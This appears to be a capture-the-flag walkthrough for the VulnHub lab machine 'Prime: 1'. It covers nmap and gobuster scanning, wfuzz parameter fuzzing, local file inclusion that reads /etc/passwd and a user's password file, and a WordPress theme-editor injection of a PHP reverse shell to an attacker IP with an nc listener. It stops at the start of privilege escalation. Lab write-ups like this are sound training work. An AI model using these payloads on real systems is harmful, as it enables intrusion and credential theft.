::::::::::::::::::::::: page
# Prime: 1 {#prime-1 .title}

\

## 

## Prime: 1

- **[Prime: 1]{style="color:#8ff0a4;"}** :-

<!-- -->

- Download the machine : <https://www.vulnhub.com/entry/prime-1,358/>

![](853-1.png)

- Extract the rar file .
- Make a machine .
- Insert vmdk file in IDE Controller .
- Start the machine .

1.  [Network Scanning]{style="color:#986a44;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](853-2.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.182
:::

![](853-3.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.182
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.182  
:::

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

::: codebox
    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.182
:::

![](853-4.png)

1.  [Web Enumeration]{style="color:#986a44;"} :

- IP visit in browser : <http://192.168.2.182/>

<!-- -->

- Directory brute force to find the endpoints :

::: codebox
    gobuster dir -u http://192.168.2.182/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
:::

![](853-5.png)

- Visit the endpoints : <http://192.168.2.182/secret.txt>
  <http://192.168.2.182/dev>

![](853-6.png) Clue found to use fuzz to find parameter .

- Visit the index.php endpoints : <http://192.168.2.182/index.php>

<!-- -->

- Find hidden or undocumented get parameters :

::: codebox
    wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://192.168.2.182/index.php?FUZZ=location.txt" --hh 136
:::

![](853-7.png) Found the correct parameter .

- Command Breakdown :

  Option         Meaning
  -------------- -------------------------------------------
  wfuzz          Starts the fuzzing tool.
  -c             Enables colored output.
  -w             Specifies the wordlist.
  -u             Specifies the target URL.
  FUZZ           Placeholder replaced by wordlist entries.
  location.txt   Fixed parameter value.
  \--hh 136      Hides responses with a 136-byte body.

- Visit the parameter :
  <http://192.168.2.182/index.php?file=location.txt>

![](853-8.png) Found the parameter secrettier360 .

- Now visit the image.php endpoint : <http://192.168.2.182/image.php>

<!-- -->

- Now try to use the secrettier360 parameter in image.php endpoints :
  <http://192.168.2.182/image.php?secrettier360>

![](853-9.png)

- We found the LFI :
  <http://192.168.2.182/image.php?secrettier360=/etc/passwd>

![](853-10.png)

- We found the normal user with password.txt file in normal user
  directory :

::: codebox
    saket:x:1001:1001:find password.txt file in my directory:/home/saket:
:::

![](853-11.png)

- Now read the password.txt file in saket home directory :
  <http://192.168.2.182/image.php?secrettier360=/home/saket/password.txt>

![](853-12.png)

- Found the password :

::: codebox
    follow_the_ippsec 
:::

1.  [Reverse Shell]{style="color:#986a44;"}

- Now login the wordpress :
  <http://192.168.2.182/wordpress/wp-login.php>

![](853-13.png)

- After login the wordpress the navigate this page :

::: codebox
    Appearance → Theme Editor → Twenty Nineteen theme → secret.php
:::

- Inject the reverse shell payload :

::: codebox
    <?php $sock=fsockopen("192.168.2.219",443);$proc=proc_open("/bin/bash -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>
:::

![](853-14.png)

- Start the listener :

::: codebox
    nc -nlvp 443
:::

- Now call the file :

::: codebox
    http://192.168.2.182/wordpress/wp-content/themes/twentynineteen/secret.php
:::

- We got the shell :

![](853-15.png)

- Navigate the home directory :

::: codebox
    cd /home
:::

- Check the directory list :

::: codebox
    ls -lh
:::

- Navigate the saket user directory and check the file list :

::: codebox
    cd saket
:::

- 

::: codebox
    ls -lh
:::

- Read the user.txt file :

::: codebox
    cat user.txt
:::

![](853-16.png)

- Found the user flag :

::: codebox
    af3c658dcf9d7190da3153519c003456
:::

1.  [Privilege Escalation]{style="color:#986a44;"} :

- Check sudo Privileges :

::: codebox
    sudo -l
:::

![](853-17.png)
:::::::::::::::::::::::
